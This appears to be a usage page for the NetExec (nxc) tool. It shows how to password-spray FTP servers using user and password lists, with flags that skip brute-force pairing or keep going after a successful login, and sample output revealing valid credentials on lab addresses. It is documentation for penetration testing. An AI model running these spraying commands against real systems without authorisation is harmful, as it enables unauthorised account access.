# Password spraying

## Password Spraying Usage 

```bash
nxc ftp <ip> -u <users.txt> -p <passwords.txt>
```

Expected Results:

```bash
nxc ftp 192.168.0.10 -u users.txt -p passwords.txt
FTP         192.168.0.10       21     192.168.0.10    [*] Banner: (vsFTPd 3.0.5)
FTP         192.168.0.10       21     192.168.0.10    [-] admin:admin (Response:530 Login incorrect.)
FTP         192.168.0.10       21     192.168.0.10    [-] root:admin (Response:530 Login incorrect.)
FTP         192.168.0.10       21     192.168.0.10    [-] marshall:admin (Response:530 Login incorrect.)
FTP         192.168.0.10       21     192.168.0.10    [-] admin:toor (Response:530 Login incorrect.)
FTP         192.168.0.10       21     192.168.0.10    [-] root:toor (Response:530 Login incorrect.)
FTP         192.168.0.10       21     192.168.0.10    [-] marshall:toor (Response:530 Login incorrect.)
FTP         192.168.0.10       21     192.168.0.10    [-] admin:badpassword (Response:530 Login incorrect.)
FTP         192.168.0.10       21     192.168.0.10    [-] root:badpassword (Response:530 Login incorrect.)
FTP         192.168.0.10       21     192.168.0.10    [+] marshall:badpassword
```

## Password spraying (without bruteforce)

```bash
nxc ftp <ip> -u <users.txt> -p <passwords.txt> --no-bruteforce
```

Expected Results:

```bash
nxc ftp 192.168.0.10 -u users.txt -p passwords.txt --no-bruteforce
FTP         192.168.0.10       21     192.168.0.10    [*] Banner: (vsFTPd 3.0.5)
FTP         192.168.0.10       21     192.168.0.10    [-] admin:admin (Response:530 Login incorrect.)
FTP         192.168.0.10       21     192.168.0.10    [-] root:toor (Response:530 Login incorrect.)
FTP         192.168.0.10       21     192.168.0.10    [+] marshall:badpassword
```

By default nxc will exit after a successful login is found per target. Using the `--continue-on-success` flag will continue spraying even after a valid password is found. Useful for spraying a single password against a large user list.

```bash
nxc ftp 127.31.0.0/31 -u users.txt -p passwords.txt --no-bruteforce --continue-on-success
FTP         127.31.0.1      21     127.31.0.1       [*] Banner: (vsFTPd 3.0.5)
FTP         127.31.0.0      21     127.31.0.0       [*] Banner: (vsFTPd 3.0.5)
FTP         127.31.0.1      21     127.31.0.1       [-] marshall:badpassword (Response:530 Login incorrect)
FTP         127.31.0.1      21     127.31.0.1       [-] admin:admin (Response:530 Login incorrect)
FTP         127.31.0.1      21     127.31.0.1       [+] root:toor
FTP         127.31.0.0      21     127.31.0.0       [+] marshall:badpassword
FTP         127.31.0.0      21     127.31.0.0       [-] admin:admin (Response:530 Login incorrect)
FTP         127.31.0.0      21     127.31.0.0       [-] root:toor (Response:530 Login incorrect)
```
